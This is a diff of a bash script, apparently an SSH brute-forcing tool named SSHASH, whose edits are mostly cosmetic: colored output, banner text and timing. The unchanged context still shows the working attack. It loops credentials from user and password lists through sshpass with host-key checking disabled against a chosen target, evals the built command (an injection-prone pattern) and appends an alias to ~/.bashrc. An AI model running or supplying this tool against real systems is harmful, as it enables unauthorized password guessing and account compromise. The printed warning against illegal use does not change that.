@@ -1,13 +1,13 @@
 #!/bin/bash
 
-#Developed by : Trabbit
+# Developed by: Trabbit
 # V2.0
 # github.com/RAPS-LAUNCHER/SSHASH
 #
 #
 
 # Configurations
-alias_to_add='alias sshash="cd && cd sshash && chmod +x * && ./sshash"'
+alias_to_add='alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
 
 if ! grep -qxF "$alias_to_add" ~/.bashrc; then
     echo "$alias_to_add" >> ~/.bashrc
@@ -49,12 +49,12 @@ function test_ssh_password {
     ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
     if output=$(eval "$ssh_command" 2>&1); then
         if [[ $output == *"SSH Login Successful"* ]]; then
-            echo "SSH Login Successful - $1:$2 [SUCCESS]"
+            echo -e "SSH Login Successful - $1:$2 [\e[42mSUCCESS\e[0m]"
         else
-            echo "SSH Login Failed - $1:$2 [FAIL]"
+            echo -e "SSH Login Failed - $1:$2 [\e[41mFAIL\e[0m]"
         fi
     else
-        echo "SSH Login Failed - $1:$2 [FAIL]"
+        echo -e "SSH Login Failed - $1:$2 [\e[41mFAIL\e[0m]"
     fi
 }
 
@@ -78,9 +78,9 @@ if [[ -z $userlist_path ]]; then
     echo "  (__ (__ |__|[__](__ |__|  "
     echo "  .__).__)|  ||  |.__)|  |  "
     echo "  ------------------------  "
-    echo "  SSH CONNEXION BRUTEFORCER "
+    echo -e "  \e[41mSSH CONNEXION BRUTEFORCER \e[0m"
     echo
-    echo "| R.C.S.A. | RAPS CYBER SECURITY AGENCY.            "
+    echo " |R.C.S.A.| RAPS CYBER SECURITY AGENCY.            "
     echo "  WARNING: DO NOT USE FOR ILLEGAL/UNETHICAL PURPOSES. "
     echo
     echo
@@ -100,6 +100,7 @@ if [[ -z $userlist_path ]]; then
     echo
     echo
     exit 1
+
 elif [[ -z $host_ip_or_url ]]; then
         clear
         echo "Please provide a target -t <URL or IP>. "
@@ -110,10 +111,8 @@ elif [[ -z $passwordlist_path ]]; then
         exit 0
 else
 
-
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
-
 
 echo "                                                              "
 echo "                               ›—zÇGÅggÞ66Þí                  "
@@ -142,7 +141,7 @@ echo "                              —ügÅÅÅÅÅÅÅÅÅÅGÏ›            
 echo "                                 —ÏgÅÅÅÅGýz›                  "
 echo "                                   ›zíiúiÿ<                   "
 echo
-echo -e "\e[33m                             DEVELOPED BY \e[35mTRABBIT          \e[0m"
+echo -e "\e[0m                             DEVELOPED BY \e[35mTRABBIT          \e[0m"
 echo
 
 
@@ -156,16 +155,16 @@ echo "           {>===============================================<}"
 
 # Display target, port, and passlist filenames, including IP or URL
 for i in "           --{[+]TARGET} => $host_ip_or_url" "           --{[+]PORT} => ${ssh_port:-22}" "           --{[+]USERLIST} => $(basename "$userlist_path")" "           --{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
-    sleep 0.2
+    sleep 0.1
     echo "$i"
 done
-sleep 0.2
+sleep 0.1
 echo "           {>===============================================<}"
 echo "                      //BRUTEFORCE ATTACK STARTED//     "
 echo "           {>===============================================<}"
 echo -n "            "
 for i in {1..49}; do
-    sleep 0.01
+    sleep 0.001
     echo -n "*"
 done
 echo
